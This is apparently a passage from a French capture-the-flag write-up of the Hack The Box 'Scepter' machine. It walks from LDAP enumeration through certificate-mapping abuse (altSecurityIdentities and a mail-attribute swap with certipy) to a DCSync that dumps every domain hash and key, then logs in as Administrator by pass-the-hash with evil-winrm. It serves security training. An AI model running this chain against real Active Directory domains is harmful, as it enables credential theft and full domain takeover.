LDAP        10.129.181.228  389    DC01                                  user
LDAP        10.129.181.228  389    DC01             cn                   p.adams
LDAP        10.129.181.228  389    DC01             givenName            p.adams
LDAP        10.129.181.228  389    DC01             distinguishedName    CN=p.adams,OU=Helpdesk Enrollment Certificate,DC=scepter,DC=htb
LDAP        10.129.181.228  389    DC01             instanceType         4
LDAP        10.129.181.228  389    DC01             whenCreated          20241031231333.0Z
LDAP        10.129.181.228  389    DC01             whenChanged          20241102220724.0Z
LDAP        10.129.181.228  389    DC01             displayName          p.adams
LDAP        10.129.181.228  389    DC01             uSNCreated           16519
LDAP        10.129.181.228  389    DC01             memberOf             CN=Replication Operators,CN=Users,DC=scepter,DC=htb
LDAP        10.129.181.228  389    DC01             uSNChanged           77892
LDAP        10.129.181.228  389    DC01             name                 p.adams
LDAP        10.129.181.228  389    DC01             objectGUID           b'\x14\x14\xce\xa7\x8e{\xb7A\x97%6\x86\xe4\xed\x80\xa7'
LDAP        10.129.181.228  389    DC01             userAccountControl   66048
LDAP        10.129.181.228  389    DC01             badPwdCount          0
LDAP        10.129.181.228  389    DC01             codePage             0
LDAP        10.129.181.228  389    DC01             countryCode          0
LDAP        10.129.181.228  389    DC01             badPasswordTime      0
LDAP        10.129.181.228  389    DC01             lastLogoff           0
LDAP        10.129.181.228  389    DC01             lastLogon            133749072618903566
LDAP        10.129.181.228  389    DC01             logonHours           b'\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff'
LDAP        10.129.181.228  389    DC01             pwdLastSet           133750080257282254
LDAP        10.129.181.228  389    DC01             primaryGroupID       513
LDAP        10.129.181.228  389    DC01             objectSid            b'\x01\x05\x00\x00\x00\x00\x00\x05\x15\x00\x00\x00:\x92v\x04\x02\x8a\xa56\xc5\x02 ,U\x04\x00\x00'
LDAP        10.129.181.228  389    DC01             accountExpires       0
LDAP        10.129.181.228  389    DC01             logonCount           1
LDAP        10.129.181.228  389    DC01             sAMAccountName       p.adams
LDAP        10.129.181.228  389    DC01             sAMAccountType       805306368
LDAP        10.129.181.228  389    DC01             userPrincipalName    p.adams@scepter.htb
LDAP        10.129.181.228  389    DC01             objectCategory       CN=Person,CN=Schema,CN=Configuration,DC=scepter,DC=htb
LDAP        10.129.181.228  389    DC01             dSCorePropagationData 20241102220819.0Z
LDAP        10.129.181.228  389    DC01                                  20241102220724.0Z
LDAP        10.129.181.228  389    DC01                                  20241102110103.0Z
LDAP        10.129.181.228  389    DC01                                  20241102074805.0Z
LDAP        10.129.181.228  389    DC01                                  16010101000001.0Z
LDAP        10.129.181.228  389    DC01             lastLogonTimestamp   133749072618903566
LDAP        10.129.181.228  389    DC01             msDS-SupportedEncryptionTypes 0
```

Donc le chemin d'attaque est le suivant :
1. Ajouter l'attribut `altSecurityIdentities` à `p.adams`
2. Changer le mail de `d.baker` en celui de `p.adams`
3. Demander un certificat
4. S'authentifier pour obtenir le hash de `p.adams` ainsi que son TGT
5. Récupérer tous les hash du domaine avec `secretsdump`
6. S'authentifier en tant qu'administrateur.

J'ajoute l'attribut `altSecurityIdentities` à `p.adams`.
```bash
╭─root@exegol-hackthebox /workspace/Scepter
╰─➤  bloodyAD --host 'dc01.scepter.htb' -u 'h.brown' -k set object 'p.adams' 'altSecurityIdentities' -v 'X509:<RFC822>p.adams@scepter.htb'
[+] p.adams's altSecurityIdentities has been updated
```

Je change le mail de `d.baker` en celui de `p.adams`.
```bash
╭─root@exegol-hackthebox /workspace/Scepter
╰─➤  bloodyAD --host 'dc01.scepter.htb' -u 'a.carter' -p 'Password@2025' set object 'd.baker' 'mail' -v 'p.adams@scepter.htb'
[+] d.baker's mail has been updated
```

Je demande un certificat en tant que `d.baker`.
```bash
╭─root@exegol-hackthebox /workspace/Scepter
╰─➤  certipy req -username "d.baker@scepter.htb" -hashes ':18b5fb0d99e7a475316213c15b6f22ce' -target "dc01.scepter.htb" -ca 'scepter-DC01-CA' -template 'StaffAccessCertificate'
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 7
[*] Got certificate without identification
[*] Certificate has no object SID
[*] Saved certificate and private key to 'd.baker.pfx'
```

L'adresse email utilisée pour demander le certificat est bien celle de `p.adams`.
```bash
╭─root@exegol-hackthebox /workspace/Scepter
╰─➤  openssl pkcs12 -info -in d.baker.pfx
Enter Import Password:
MAC: sha256, Iteration 2048
MAC length: 32, salt length: 8
PKCS7 Data
Certificate bag
Bag Attributes
    friendlyName:
    localKeyID: 00 11 34 78 94 19 5A 5F 7A A7 B7 7B 97 A3 38 C1 2B 4B 7F D5
subject=CN = d.baker, emailAddress = p.adams@scepter.htb
issuer=DC = htb, DC = scepter, CN = scepter-DC01-CA
```

Je m'authentifie et j'obtiens alors le hash NTLM ainsi que le TGT de `p.adams`.
```bash
╭─root@exegol-hackthebox /workspace/Scepter
╰─➤  certipy auth -pfx d.baker.pfx -domain "scepter.htb" -username 'p.adams'
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[!] Could not find identification in the provided certificate
[*] Using principal: p.adams@scepter.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'p.adams.ccache'
[*] Trying to retrieve NT hash for 'p.adams'
[*] Got hash for 'p.adams@scepter.htb': aad3b435b51404eeaad3b435b51404ee:1b925c524f447bb821a8789c4b118ce0
```

### DCSync

J'utilise alors `secretsdump` pour obtenir les hash de tous les utilisateurs.
```bash
╭─root@exegol-hackthebox /workspace/Scepter
╰─➤  secretsdump -k -no-pass 'scepter.htb/p.adams@dc01.scepter.htb'
Impacket v0.13.0.dev0+20250107.155526.3d734075 - Copyright Fortra, LLC and its affiliated companies

[-] Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:a291ead3493f9773dc615e66c2ea21c4:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:c030fca580038cc8b1100ee37064a4a9:::
scepter.htb\d.baker:1106:aad3b435b51404eeaad3b435b51404ee:18b5fb0d99e7a475316213c15b6f22ce:::
scepter.htb\a.carter:1107:aad3b435b51404eeaad3b435b51404ee:2e24650b1e4f376fa574da438078d200:::
scepter.htb\h.brown:1108:aad3b435b51404eeaad3b435b51404ee:4ecf5242092c6fb8c360a08069c75a0c:::
scepter.htb\p.adams:1109:aad3b435b51404eeaad3b435b51404ee:1b925c524f447bb821a8789c4b118ce0:::
scepter.htb\e.lewis:2101:aad3b435b51404eeaad3b435b51404ee:628bf1914e9efe3ef3a7a6e7136f60f3:::
scepter.htb\o.scott:2102:aad3b435b51404eeaad3b435b51404ee:3a4a844d2175c90f7a48e77fa92fce04:::
scepter.htb\M.clark:2103:aad3b435b51404eeaad3b435b51404ee:8db1c7370a5e33541985b508ffa24ce5:::
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:0a4643c21fd6a17229b18ba639ccfd5f:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:cc5d676d45f8287aef2f1abcd65213d9575c86c54c9b1977935983e28348bcd5
Administrator:aes128-cts-hmac-sha1-96:bb557b22bad08c219ce7425f2fe0b70c
Administrator:des-cbc-md5:f79d45bf688aa238
krbtgt:aes256-cts-hmac-sha1-96:5d62c1b68af2bb009bb4875327edd5e4065ef2bf08e38c4ea0e609406d6279ee
krbtgt:aes128-cts-hmac-sha1-96:b9bc4dc299fe99a4e086bbf2110ad676
krbtgt:des-cbc-md5:57f8ef4f4c7f6245
scepter.htb\d.baker:aes256-cts-hmac-sha1-96:6adbc9de0cb3fb631434e513b1b282970fdc3ca089181991fb7036a05c6212fb
scepter.htb\d.baker:aes128-cts-hmac-sha1-96:eb3e28d1b99120b4f642419c99a7ac19
scepter.htb\d.baker:des-cbc-md5:2fce8a3426c8c2c1
scepter.htb\a.carter:aes256-cts-hmac-sha1-96:5a793dad7f782356cb6a741fe73ddd650ca054870f0c6d70fadcae162a389a71
scepter.htb\a.carter:aes128-cts-hmac-sha1-96:f7643849c000f5a7a6bd5c88c4724afd
scepter.htb\a.carter:des-cbc-md5:d607b098cb5e679b
scepter.htb\h.brown:aes256-cts-hmac-sha1-96:5779e2a207a7c94d20be1a105bed84e3b691a5f2890a7775d8f036741dadbc02
scepter.htb\h.brown:aes128-cts-hmac-sha1-96:1345228e68dce06f6109d4d64409007d
scepter.htb\h.brown:des-cbc-md5:6e6dd30151cb58c7
scepter.htb\p.adams:aes256-cts-hmac-sha1-96:0fa360ee62cb0e7ba851fce9fd982382c049ba3b6224cceb2abd2628c310c22f
scepter.htb\p.adams:aes128-cts-hmac-sha1-96:85462bdef70af52770b2260963e7b39f
scepter.htb\p.adams:des-cbc-md5:f7a26e794949fd61
scepter.htb\e.lewis:aes256-cts-hmac-sha1-96:1cfd55c20eadbaf4b8183c302a55c459a2235b88540ccd75419d430e049a4a2b
scepter.htb\e.lewis:aes128-cts-hmac-sha1-96:a8641db596e1d26b6a6943fc7a9e4bea
scepter.htb\e.lewis:des-cbc-md5:57e9291aad91fe7f
scepter.htb\o.scott:aes256-cts-hmac-sha1-96:4fe8037a8176334ebce849d546e826a1248c01e9da42bcbd13031b28ddf26f25
scepter.htb\o.scott:aes128-cts-hmac-sha1-96:37f1bd1cb49c4923da5fc82b347a25eb
scepter.htb\o.scott:des-cbc-md5:e329e37fda6e0df7
scepter.htb\M.clark:aes256-cts-hmac-sha1-96:a0890aa7efc9a1a14f67158292a18ff4ca139d674065e0e4417c90e5a878ebe0
scepter.htb\M.clark:aes128-cts-hmac-sha1-96:84993bbad33c139287239015be840598
scepter.htb\M.clark:des-cbc-md5:4c7f5dfbdcadba94
DC01$:aes256-cts-hmac-sha1-96:4da645efa2717daf52672afe81afb3dc8952aad72fc96de3a9feff0d6cce71e1
DC01$:aes128-cts-hmac-sha1-96:a9f8923d526f6437f5ed343efab8f77a
DC01$:des-cbc-md5:d6923e61a83d51ef
```

Je me connecte alors et je récupère le flag root.
```bash
╭─root@exegol-hackthebox /workspace/Scepter
╰─➤  evil-winrm -i dc01.scepter.htb -u 'administrator' -H 'a291ead3493f9773dc615e66c2ea21c4'

Evil-WinRM shell v3.7

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> type ../Desktop/root.txt
244d5d33978a1ce9bae5ff44dd5f02eb
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```
